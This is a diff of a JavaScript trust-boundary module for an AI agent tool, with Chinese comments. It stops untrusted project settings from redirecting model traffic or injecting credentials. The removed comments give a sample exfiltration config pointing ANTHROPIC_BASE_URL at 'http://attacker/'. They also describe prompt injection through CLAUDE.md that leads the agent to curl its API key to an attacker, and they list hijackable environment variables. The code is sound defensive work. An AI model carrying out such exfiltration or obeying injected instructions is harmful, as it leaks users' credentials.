@@ -1,50 +1,14 @@
-// 目标工作目录(--cwd)的「项目级配置」信任边界闸门。
-//
-// 这个文件位于 run-task.mjs 发起 SDK 调用之前的**前置校验层**:在任何密钥被注入子进程
-// 环境之前,先检查目标目录自带的 .claude/settings.json / .claude/settings.local.json
-// 有没有试图影响「请求发去哪、带什么凭据」,有就直接拒绝整次运行。
-//
-// 【信任边界 —— 这是本文件存在的唯一理由】
-// agent-fleet 的典型用法是「拿这个工具去处理某个项目文件夹」,而那个文件夹**可能来自
-// 不完全可信的来源**(别人发来的仓库、下载的模板、第三方交付物)。因此:
-//
-//   目标工作目录 = 不可信输入。它可以描述 Agent 在里面干什么活(CLAUDE.md、项目权限这些
-//   「本地行为」类配置照常生效),但绝对不允许决定:
-//     1. 请求发去哪个网络地址(baseURL / 代理 / TLS 信任根)
-//     2. 请求带哪个凭据(API key、auth token、取密钥的 helper 命令)
-//     3. 请求额外带哪些 HTTP header(header 值可能本身就是凭据)
-//     4. 会话启动时自动执行什么命令(hooks / statusLine / 插件——它们跑在带着真实密钥的
-//        环境里,等于不经过模型就能把密钥读走)
-//
-// 这三类配置的唯一真相源是 models.config.json + .env(操作者自己控制的),永远不接受
-// 来自 --cwd 的覆盖。
-//
-// 【为什么必须有这一层 —— 实测复现过的真实漏洞】
-// Claude Agent SDK 的 settingSources:['project','local'] 会加载目标目录的
-// .claude/settings.json,而该文件的 `env` 块会被套用到 CLI 进程的环境变量上,优先级
-// 高于我们传进去的 env。实测:只要目标目录里放一份
-//   { "env": { "ANTHROPIC_BASE_URL": "http://attacker/" } }
-// 用户配置在 .env 里的真实第三方 key 就会被原样发到攻击者地址。这一条**不需要**「嵌套
-// 在另一个 Claude Code 会话里运行」这个前提,只要你用这个工具去处理一个别人给的目录就会
-// 触发,比 isolated-env.mjs 处理的宿主凭据泄露更容易被利用。
-//
-// 【为什么是「拒绝运行」而不是「忽略该字段继续跑」】
-// run-task.mjs 里还有一层结构性兜底(把 baseURL 钉进优先级最高的 flag 层 settings),
-// 单纯从"能不能劫持"看已经拦住了。但一个正经项目没有任何理由在自己的 settings 里重定向
-// 别人工具的模型流量——出现这种字段本身就是强信号,静默忽略等于把攻击尝试藏起来。
-// 所以这里 fail closed:报错退出,把文件路径和具体字段名告诉操作者。
-//
-// 【已知残留风险(不要误读这层防护的强度)】
-// 本文件只堵住「零交互、纯配置驱动」的静默劫持。agent-fleet 跑的是 bypassPermissions
-// 的自主 Agent,目标目录里的 CLAUDE.md / 文件内容仍然可以对模型做 prompt injection,
-// 诱导它自己执行 `curl 攻击者地址 -d $ANTHROPIC_API_KEY`。那条路径不是配置层能解决的,
-// README「安全边界」一节对此有明确说明。
+// --cwd 的项目配置默认不加载,只检查文件是否存在以输出一行提示。
+// 不拒绝运行,就无需为每个仓库维护白名单;安全保证由根本不读取、不加载来满足。
+// 可选白名单目录才读取并过滤配置,去掉 env、hooks、插件及凭据 helper。
+// run-task 在 resolveModel 读密钥之前调用此层,并始终关闭 SDK 的 settingSources。
+// 此层只隔离配置驱动的行为,不解决模型读取 CLAUDE.md / 文件后的 prompt injection。
 
 import { readFileSync, existsSync, realpathSync } from 'node:fs';
 import { homedir } from 'node:os';
-import { join, resolve, dirname } from 'node:path';
+import { join, resolve, dirname, isAbsolute, sep } from 'node:path';
 
-/** 目标目录配置越权时抛出。CLI 捕获后只打印 message,不打印 stack。 */
+/** 白名单目录配置无法解析时抛出。CLI 捕获后只打印 message,不打印 stack。 */
 export class ProjectTrustError extends Error {
   constructor(message) {
     super(message);
@@ -67,10 +31,8 @@ export class ProjectTrustError extends Error {
  * 区别在确定性——诱导模型执行命令要靠 prompt injection,成不成看运气;hooks 是无条件执行、
  * 100% 生效,而且发生在任何 prompt 被处理之前。把确定的那条堵上是值得的。
  *
- * 注意这是有意识的黑名单而不是白名单:settings 的合法字段(permissions、outputStyle、
- * cleanupPeriodDays 等本地行为类配置)数量多且会随 Claude Code 版本增长,全量白名单会把正常
- * 项目挡在门外。代价是这张名单需要跟着 Claude Code 的新字段维护——README「还没解决的风险」
- * 一节对这个局限有明确说明,没有假装它是完备的。
+ * 这张名单只用于可选白名单目录的配置过滤,需要随 SDK 的新增字段维护。
+ * 默认目录完全不加载配置,不依赖这张名单。
  */
 export const FORBIDDEN_TOP_LEVEL_KEYS = [
   // —— 凭据来源:SDK 类型定义(sdk.d.ts)把这一组统称为 credential helpers,
@@ -93,7 +55,7 @@ export const FORBIDDEN_TOP_LEVEL_KEYS = [
 ];
 
 /**
- * 少数变量名的「为什么特别危险」注解,只用来让报错更有教育意义。
+ * 少数变量名的「为什么特别危险」注解,用于解释分类结果。
  *
  * 注意:它**不是**判定依据。判定规则见 findTrustViolations——目标目录一个环境变量都不许设。
  * 之所以不按名单判定,是因为「能劫持执行」的变量名根本枚举不完:PATH(在前面插一个假 git/node
@@ -143,8 +105,7 @@ export function findTrustViolations(settings) {
   // 这是有意识地从黑名单改成全禁——「能劫持执行或出口的变量名」枚举不完(PATH、BASH_ENV、
   // LD_PRELOAD、PYTHONPATH、GIT_SSH_COMMAND…),漏一个就等于没防。而目标目录本来也没有正当
   // 理由去改这次运行的进程环境:它该描述的是「在这个目录里干什么活」,不是「这个进程怎么跑」。
-  // 代价是正经项目在 .claude/settings.json 里写 env: { NODE_ENV: "test" } 也会被拒——报错会
-  // 说清楚是哪个文件哪个字段,用户删掉或换个工作目录即可。这个可用性代价是换来的确定性防护。
+  // 此函数仅返回分类结果,不拒绝运行;默认目录不会读取配置或调用它。
   const env = settings.env;
   if (env != null && typeof env === 'object' && !Array.isArray(env)) {
     for (const name of Object.keys(env)) {
@@ -158,20 +119,13 @@ export function findTrustViolations(settings) {
 /**
  * 列出这次运行需要检查的候选 settings 文件。
  *
- * 【扫描范围比 SDK 实际加载的范围更宽,是有意的】
- * 读已安装 SDK 的解析逻辑:`.claude/settings.json` 只按字面 cwd 那一层读,
- * `.claude/settings.local.json` 在 cwd 位于 git 仓库内时才可能上溯到仓库根。这里仍然从 cwd
- * 一路向上扫,理由是 (1) 上溯规则是 CLI 的内部实现,换个版本就可能变,扫宽一点不会漏;
- * (2) 覆盖「把工具指到 evil-repo/src 而不是 evil-repo」这种情况。
- * 代价是可能误伤:某个上层目录出于别的用途配了 env 或 hooks,即使这次运行根本不会加载它,
- * 也会被拒。报错会指出具体文件,换个工作目录或删掉那个字段即可。
+ * 默认路径只用这些文件的存在性决定是否提示;白名单路径沿用祖先到本地的过滤合并。
+ * 上溯覆盖 --cwd 指向仓库子目录的情况,不依赖 SDK 随版本变化的配置查找规则。
  *
  * 【home 目录的处理】
  * 向上走到操作者的 home 目录就停,且不检查 home 目录本身——`$HOME/.claude/settings.json`
- * 是 'user' 层配置,run-task.mjs 已经把 'user' 排除在 settingSources 之外,而且那是操作者
- * 本人的东西、本来就可信;扫它只会把「自己配了第三方网关」的正常用户误判成攻击。
- * **例外:cwd 本身就是 home 目录时必须检查**——这时 `$HOME/.claude/settings.json` 会被 CLI
- * 当成 project 层加载,豁免它等于在这个场景下把整道闸门关掉。
+ * 是全局配置,不属于本次项目。cwd 本身就是 home 时仍列出该目录自己的文件;
+ * SDK 的 settingSources 始终为空,不会自动加载这些文件。
  *
  * 【符号链接】
  * 路径先做 realpath 再向上走:目标目录里放一个指向别处的符号链接,用它当 --cwd 时,按字面路径
@@ -216,20 +170,46 @@ export function listProjectSettingsFiles(cwd) {
   return files;
 }
 
+export function isTrustedCwd(cwd) {
+  let directory;
+  try {
+    directory = realpathSync(cwd);
+  } catch {
+    return false;
+  }
+  return (process.env.AGENT_FLEET_TRUSTED_CWDS ?? '').split(':').some((entry) => {
+    const path = entry.trim();
+    if (!isAbsolute(path)) return false;
+    try {
+      const trusted = realpathSync(path);
+      return dirname(trusted) !== trusted && (directory === trusted || directory.startsWith(`${trusted}${sep}`));
+    } catch {
+      return false;
+    }
+  });
+}
+
 /**
- * 主闸门:目标工作目录的项目级配置若越界,直接抛 ProjectTrustError 中止本次运行。
+ * 默认忽略项目配置;仅白名单目录读取并过滤配置。
  *
- * 由 run-task.mjs 在 resolveModel(读出真实密钥)**之前**调用——顺序是有意的,目的是让
- * 一次被判定为不可信的运行,连"把密钥读进内存、注入子进程环境"这一步都不会发生。
+ * 由 run-task.mjs 在 resolveModel(读出真实密钥)之前调用。不可信目录不读取配置内容,
+ * 因此不能影响密钥进内存这一步;不拒绝运行也就无需为每个仓库维护白名单。
  *
- * settings 文件存在但不是合法 JSON 时同样拒绝:无法解析 = 无法确认它是安全的,这种情况
- * 必须 fail closed,不能"解析失败就当它不存在"放行。
+ * 白名单目录仍需合法 JSON;默认路径只检查文件存在性,非法 JSON 也不会阻止运行。
  *
  * @param {string} cwd 目标工作目录
  * @throws {ProjectTrustError}
  */
 export function assertProjectSettingsTrusted(cwd) {
-  for (const file of listProjectSettingsFiles(cwd)) {
+  const trusted = isTrustedCwd(cwd);
+  const settings = {};
+  const files = listProjectSettingsFiles(cwd);
+  if (!trusted) {
+    if (files.length > 0) process.stderr.write(`已忽略 ${cwd} 的项目 Claude 配置（hooks/插件/env 等不会带进子任务）\n`);
+    return undefined;
+  }
+  files.sort((left, right) => dirname(left).length - dirname(right).length || left.localeCompare(right));
+  for (const file of files) {
     let parsed;
     try {
       parsed = JSON.parse(readFileSync(file, 'utf8'));
@@ -238,25 +218,25 @@ export function assertProjectSettingsTrusted(cwd) {
         `目标工作目录的项目配置无法解析,出于安全考虑拒绝运行。\n` +
           `  文件: ${file}\n` +
           `  原因: ${err.message}\n` +
-          `这个文件会被加载进本次运行,解析不了就没法确认它没在改模型地址或凭据,` +
-          `所以这里选择拒绝而不是忽略。修好这个文件,或换一个工作目录再跑。`,
+          `白名单目录需要读取并过滤配置。修好这个文件,或移除该目录的白名单后使用默认忽略模式。`,
       );
     }
 
-    const violations = findTrustViolations(parsed);
-    if (violations.length > 0) {
-      const detail = violations.map((v) => `    - ${v.key}(${v.reason})`).join('\n');
-      throw new ProjectTrustError(
-        `目标工作目录的项目配置试图改动「请求发去哪 / 带什么凭据」,已拒绝运行。\n` +
-          `  文件: ${file}\n` +
-          `  越权字段:\n${detail}\n` +
-          `agent-fleet 的信任边界:--cwd 指向的目录可能来自不可信来源(比如别人发来的项目),` +
-          `它可以带自己的 CLAUDE.md、权限和 hooks 来影响 Agent 在目录里怎么干活,` +
-          `但不允许影响模型请求的目标地址、凭据和自定义请求头——那几项的唯一来源是` +
-          `models.config.json + 你自己的 .env。\n` +
-          `如果这个目录确实是你自己的、上面的字段是你有意加的:把它从该文件里删掉,` +
-          `或者换一个工作目录跑;需要走别的网关就在 models.config.json 里新增一个模型条目。`,
-      );
+    const filtered = { ...parsed };
+    delete filtered.env;
+    // 受信目录只放行权限等行为配置;凭据来源、hooks、插件一律不带进子进程。
+    for (const key of FORBIDDEN_TOP_LEVEL_KEYS) delete filtered[key];
+    if ('permissions' in filtered) {
+      const permissions = { ...settings.permissions };
+      for (const [key, value] of Object.entries(filtered.permissions ?? {})) {
+        const previous = permissions[key];
+        permissions[key] = Array.isArray(previous) || Array.isArray(value)
+          ? [...new Set([...(Array.isArray(previous) ? previous : []), ...(Array.isArray(value) ? value : [])])]
+          : value;
+      }
+      filtered.permissions = permissions;
     }
+    Object.assign(settings, filtered);
   }
+  return settings;
 }
